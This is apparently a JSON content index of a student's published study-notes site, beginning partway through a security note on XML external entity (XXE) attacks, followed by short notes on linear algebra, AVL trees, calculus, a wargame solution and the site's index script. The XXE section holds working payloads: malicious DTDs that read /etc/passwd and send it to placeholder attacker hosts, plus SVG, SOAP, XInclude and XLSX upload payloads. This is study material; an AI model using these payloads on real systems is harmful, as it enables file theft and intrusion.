encoding=\"UTF-8\"?>\n<!DOCTYPE foo [ <!ENTITY % param SYSTEM \"http://evil.com\"> %param; ]>\n<yeet>data</yeet>\n```\n\n### Data Ex-filtration\n\n1.  With SSRF\n\n    Ex-filtrating data from blind XXE vulnerabilities is possible using a malicious [DTD](https:www.w3schools.com/xml/xml_dtd.asp). In order to exploit it, we need a server to serve a malicious DTD. Here is an example DTD:\n\n    ``` xml\n    <!ENTITY % file SYSTEM \"file:///etc/passwd\">\n    <!ENTITY % eval \"<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>\">\n    %eval;\n    %exfiltrate;\n    ```\n\n    You can then host this in a file under your server, accessible from a URL like `http://attacker.com/extractpasswd.dtd`. You can then use this file in an XXE payload like this:\n\n    ``` xml\n    <?xml version=\"1.0\" encoding=\"UTF-8\"?>\n    <!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/extractpasswd.dtd\"> %xxe;]>\n    <yeet>data</yeet>\n    ```\n\n    This method doesn\\'t work in multiline files however, so it can be used to leak files like `/etc/hostname`.\n\n2.  With Error Messages\n\n    If a web application returns error messages which can possibly contain details of an entity, this too can be exploited using a DTD. DTD Document:\n\n    ``` xml\n    <!ENTITY % file SYSTEM \"file:///etc/passwd\">\n    <!ENTITY % eval \"<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>\">\n    %eval;\n    %error;\n    ```\n\n    XXE Payload:\n\n    ``` xml\n    <?xml version=\"1.0\" encoding=\"UTF-8\"?>\n    <!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/error.dtd\"> %xxe;]>\n    <yeet>data</yeet>\n    ```\n\n3.  Repurposing existing DTD files in a server\n\n    When out-of-band interactions are disabled by the web server\\'s network settings or any other method, it won\\'t be possible to include external DTD files. Hence, Blind XXE injection can only be exploited using a known DTD files in a system and using that file to leak data in the form of error messages. However, this DTD file should first be *edited* with a malicious XXE payload that accesses system files. Thankfully, XML allows us to **overwrite** some entries in an external DTD. For instance, if in a server there is a DTD file named /etc/DTDs/localdtd.dtd that also contains an entity named **localentity**, we can use the following payload to **overwrite** that entity.\n\n    ``` xml\n    <!DOCTYPE foo [\n    <!ENTITY % local_dtd SYSTEM \"file:///etc/DTDs/localdtd.dtd\">\n    <!ENTITY %  localentity'\n    <!ENTITY &#x25; file SYSTEM \"file:///etc/passwd\">\n    <!ENTITY &#x25; eval \"<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>\">\n    &#x25;eval;\n    &#x25;error;\n    '>\n    %local_dtd;\n    ]>\n    ```\n\n    Locating such files should be fairly straightforward since the web application returns errors from the xml parser, we can simply check whether a file exists by sending a benign payload and checking whether the server returns an error(the file doesn\\'t exist) or not(the file exists)\n\n    ``` xml\n    <!DOCTYPE foo [\n    <!ENTITY % local_dtd SYSTEM \"file:///usr/share/test.dtd\">\n    %local_dtd;\n    ]>\n    ```\n\n## Exploiting XInclude\n\nSometimes, even if you don\\'t send XML data to a website, the application could still use the input you provided it to create an XML document. However, if the proper sanitisations are not made on the input, the final XML could be edited which can again be used to leak file information or to cause out-of-band interactions. Here is a sample payloads that uses xinclude:\n\n``` xml\n<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\">\n<xi:include parse=\"text\" href=\"file:///etc/passwd\"/></foo>\n```\n\n## File Upload Attacks\n\nIn theory, any file upload that uses xml and is parsed on the back-end side can be exploited. There are different methods for different filetypes and each should be tested thoroughly.\n\n### Image Uploads with SVG\n\nImage upload forms can be vulnerable to XXE if they allow uploading SVG files. Here is a sample payload that should be tested:\n\n``` xml\n<?xml version=\"1.0\" standalone=\"yes\"?>\n<!DOCTYPE test [ <!ENTITY xxe SYSTEM \"file:///etc/hostname\" > ]>\n<svg width=\"128px\" height=\"128px\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" version=\"1.1\">\n  <text font-size=\"16\" x=\"0\" y=\"16\">&xxe;</text>\n</svg>\n```\n\n### SOAP XXE\n\nThis payload should be tested on every parameter where a SOAP query could be formed in the backend:\n\n``` xml\n<soap:Body>\n  <foo>\n    <![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM \"http://x.x.x.x:22/\"> %dtd;]><xxx/>]]>\n  </foo>\n</soap:Body>\n```\n\n### DOCX\n\nA great tool exists for injecting in docx files: <https://github.com/BuffaloWill/oxml_xxe>\n\n### XLSX\n\n1.  Extract the excel file:\n\n```{=html}\n<!-- -->\n```\n    $ mkdir XXE && cd XXE\n    $ unzip ../XXE.xlsx\n    Archive:  ../XXE.xlsx\n      inflating: xl/drawings/drawing1.xml\n      inflating: xl/worksheets/sheet1.xml\n      inflating: xl/worksheets/_rels/sheet1.xml.rels\n      inflating: xl/sharedStrings.xml\n      inflating: xl/styles.xml\n      inflating: xl/workbook.xml\n      inflating: xl/_rels/workbook.xml.rels\n      inflating: _rels/.rels\n      inflating: [Content_Types].xml\n\n1.  Add your blind XXE payload in `xl/workbook.xml` or add your payload in `xl/sharedStrings.xml`\n\nxl/workbook.xml\n\n``` xml\n<xml...>\n  <!DOCTYPE x [ <!ENTITY xxe SYSTEM \"http://YOURCOLLABORATORID.burpcollaborator.net/\"> ]>\n  <x>&xxe;</x>\n  <workbook...>\n```\n\nxl/sharedString.xml\n\n``` xml\n<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n<!DOCTYPE foo [ <!ELEMENT t ANY > <!ENTITY xxe SYSTEM \"http://YOURCOLLABORATORID.burpcollaborator.net/\"> ]>\n<sst xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\" count=\"10\" uniqueCount=\"10\"><si><t>&xxe;</t></si><si><t>testA2</t></si><si><t>testA3</t></si><si><t>testA4</t></si><si><t>testA5</t></si><si><t>testB1</t></si><si><t>testB2</t></si><si><t>testB3</t></si><si><t>testB4</t></si><si><t>testB5</t></si></sst>\n```\n\n1.  rebuild the Excel file:\n\n```{=html}\n<!-- -->\n```\n    $ zip -r ../poc.xlsx *\n    updating: [Content_Types].xml (deflated 71%)\n    updating: _rels/ (stored 0%)\n    updating: _rels/.rels (deflated 60%)\n    updating: docProps/ (stored 0%)\n    updating: docProps/app.xml (deflated 51%)\n    updating: docProps/core.xml (deflated 50%)\n    updating: xl/ (stored 0%)\n    updating: xl/workbook.xml (deflated 56%)\n    updating: xl/worksheets/ (stored 0%)\n    updating: xl/worksheets/sheet1.xml (deflated 53%)\n    updating: xl/styles.xml (deflated 60%)\n    updating: xl/theme/ (stored 0%)\n    updating: xl/theme/theme1.xml (deflated 80%)\n    updating: xl/_rels/ (stored 0%)\n    updating: xl/_rels/workbook.xml.rels (deflated 66%)\n    updating: xl/sharedStrings.xml (deflated 17%)","aliases":null,"description":null},"/notes/Free-and-Basic-Variables":{"title":"Free and Basic Variables","date":"2022-02-22T04:28:22+01:00","description":null,"tags":["math/linear"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"A variable in a linear system can either be **basic**, or **free**.\n\nA variable is basic if when reduced to [[/notes/Echeleon Forms|echeleon form]], it acts as a pivot. Otherwise, it is a free variable. If there are any free variables in a linear systems, it has got [[/notes/Solutions of Linear Systems|infinite solutions]]."},"/notes/AVL-Trees":{"title":"AVL Trees","date":"2022-01-02T10:30:38+03:00","description":null,"tags":["cs/data-structures","cs/algorithms","cs/trees"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.314596","content":"Keeping a [[/notes/Binary Tree|Binary Tree]] [[/notes/Balanced Binary Search Trees|balanced]] is crucial to sustain its performance, and AVLs trees ensure that by enforcing one simple rule to these trees:\n> Any nodes children can have a height difference of 1 at maximum\n\nIn order to sustain this property upon [[/notes/AVL Tree Operations|insertion and deletion]], there are special methods."},"/notes/Linearization-of-Multivariable-Functions":{"title":"Linearization of Multivariable Functions","date":"2022-01-19T01:48:16+01:00","description":null,"tags":["math/multivar","math/calculus"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"In single variable functions, it was possible to draw a tangent line that touches the function at a certain point $a$. Similarly, in [[/notes/Multivariable Functions|Multivariable Functions]], it is possible to draw a *tangent plane* to the surface of the function, which linearizes that function at the point $(a,b)$ and at points close to it. The linearized plane's function at $(a,b)$ is calculated by:\n\n$$\nL(x) = f(a,b) + \\frac{\\partial f}{\\partial x}(x-a) + \\frac{\\partial f}{\\partial y}(y-b)\n$$"},"/notes/krypton01":{"title":"krypton0 && krypton1","date":"2021-11-16T21:07:41+01:00","tags":["cs/security","cs/cryptography"],"lastmodified":"2022-06-19T20:46:41.322597","content":"-   krypton0: `echo S1JZUFRPTklTR1JFQVQ= | base64 -d` (KRYPTONISGREAT)\n-   krypton1: `cat krypton2 | tr A-Z N-ZA-M` (ROTTEN)","aliases":null,"description":null},"/index":{"title":"Welcome!","date":"2021-11-16T21:07:41+01:00","lastmodified":"2022-06-19T20:46:41.298596","content":"I am Yigit, a first year Computer Science student at TU Delft. But this site is\nnot about me, it is about my notes. If you want to learn more about to me, you\ncan visit my [website](https://yigitcolakoglu.com), or my\n[blog](https://fr1nge.xyz).\n\nThis website is a published version of my zettelkasten. Here, I keep my notes,\neach of which I try to keep atomic. The notes are given tags according to the\ntopics they are related to and also, most notes either contain links to other\nnotes are linked to by other notes. These two principles allows structure to\nnaturally emerge from the flat folder structure that makes the zettelkasten.\n\nI am currently attending university in TU Delft I keep many notes related to\nCS, here is some of the recent ones:\n\n```js-block\nfunction genIndex(arr, key, comparator){\n\treturn Array.from(Array(arr.length).keys())\n  .sort((a, b) => comparator(arr[a][key], arr[b][key]) < 0 ? -1 : (comparator(arr[b][key],arr[a][key]) < 0) | 0);\n}\n\nfunction regexSearchList(r, l){\n\tlet count = 0;\n\tfor(let i in l){\n\t\tif(l[i].search(r) != -1){\n\t\t\tcount++;\n\t\t}\n\t}\n\treturn count;\n}\n\nfunction truncateString(str, num) {\n  if (str.length > num) {\n    return str.slice(0, num) + \"...\";\n  } else {\n    return str;\n  }\n}\n\nfunction genNoteLinkElement(obj){\n\tlet anchor = document.createElement(\"a\") \n\tanchor.setAttribute('href', obj['relPath'])\n\tanchor.setAttribute('rel', \"noopener\") \n\tanchor.setAttribute('class', \"internal-link\")\n\tanchor.setAttribute('data-src', obj['relPath'])\n\tanchor.innerText = obj['title'];\n\n\treturn anchor;\n}\n\nfunction genTagList(tags){\n\tlet ul = document.createElement(\"ul\");\n\tul.setAttribute(\"class\", \"tags inline\");\n\t\n\tfor(let i in tags){\n\t\tlet t = tags[i];\n\t\tlet li = document.createElement(\"li\");\n\t\tlet a = document.createElement(\"a\");\n\t\ta.setAttribute(\"href\", `/tags/${t}`);\n\t\ta.innerText = t;\n\t\tli.appendChild(a);\n\t\tul.appendChild(li);\n\t}\n\treturn ul;\n}\n\n\nasync function run(){\n  let encoder = (str) => str.toLowerCase().split(/([^a-z]|[^\\x00-\\x7F])+/)\n  let contentTable = [];\n\n  const { content } = await fetchData;\n  for (const [key, value] of Object.entries(content)) {\n  \tvalue[\"relPath\"] = key; \n  \tcontentTable.push(value);\n  }\n  \n  let dateIndex = genIndex(contentTable, 'date', (a,b) => {\n  \tlet d1 = Date.parse(a);\n\tlet d2 = Date.parse(b);\n\treturn (d1 > d2) - (d1 < d2)\n  });\n  \n  dateIndex.reverse();\n  \n  let count = 0;\n  let i = 0;\n  \n  let ul = document.createElement(\"ul\");\n  while (count < 15 && i < dateIndex.length){\n  \tlet note = contentTable[dateIndex[i]];\n\tif(!note){\n\t\ti++;\n\t\tcontinue;\n\t}\n\t\n\tif (regexSearchList(\"cs/.*\", note['tags']) != 0\n\t      && ! note['tags'].includes('cs/security')){\n\t\tcount++;\n\t\tlet el = genNoteLinkElement(note);\n\t\tlet li = document.createElement('li');\n\t\tli.appendChild(el);\n\t\tli.appendChild(genTagList(note['tags']));\n\t\tul.appendChild(li);\n\t}\n\t\n\ti++;\n  }\n\t\n  if(count > 0){\n  \toutputDiv.appendChild(ul);\n  }\n  \n  let p = document.createElement(\"p\");\n  p.innerText = \"Even though they are very crude, I also keep some math-related notes:\";\n  \n  outputDiv.appendChild(p);\n\t\n  \n  count = 0;\n  i = 0;\n  \n  ul = document.createElement(\"ul\");\n  while (count < 15 && i < dateIndex.length){\n  \tlet note = contentTable[dateIndex[i]];\n\tif(!note){\n\t\ti++;\n\t\tcontinue;\n\t}\n\t\n\tif (regexSearchList(\"math/.*\", note['tags']) != 0){\n\t\tcount++;\n\t\tlet el = genNoteLinkElement(note);\n\t\tlet li = document.createElement('li');\n\t\tli.appendChild(el);\n\t\tli.appendChild(genTagList(note['tags']));\n\t\tul.appendChild(li);\n\t}\n\t\n\ti++;\n  }\n\t\n  if(count > 0){\n  \toutputDiv.appendChild(ul);\n  }\n  \n   \n  p = document.createElement(\"p\");\n  p.innerHTML = 'The most chaotic ones are my security notes. <em>\"He who enter here abandon all hope.\"</em>';\n  \n  outputDiv.appendChild(p);\n\t\n  \n  count = 0;\n  i = 0;\n  \n  ul = document.createElement(\"ul\");\n  while (count < 15 && i < dateIndex.length){\n  \tlet note = contentTable[dateIndex[i]];\n\tif(!note){\n\t\ti++;\n\t\tcontinue;\n\t}\n\t\n\tif (note['tags'] && note['tags'].includes('cs/security')){\n\t\tcount++;\n\t\tlet el = genNoteLinkElement(note);\n\t\tlet li = document.createElement('li');\n\t\tli.appendChild(el);\n\t\tli.appendChild(genTagList(note['tags']));\n\t\tul.appendChild(li);\n\t}\n\t\n\ti++;\n  }\n\t\n  if(count > 0){\n  \toutputDiv.appendChild(ul);\n  }\n}\n\nrun();\n```","tags":null,"aliases":null,"description":null}}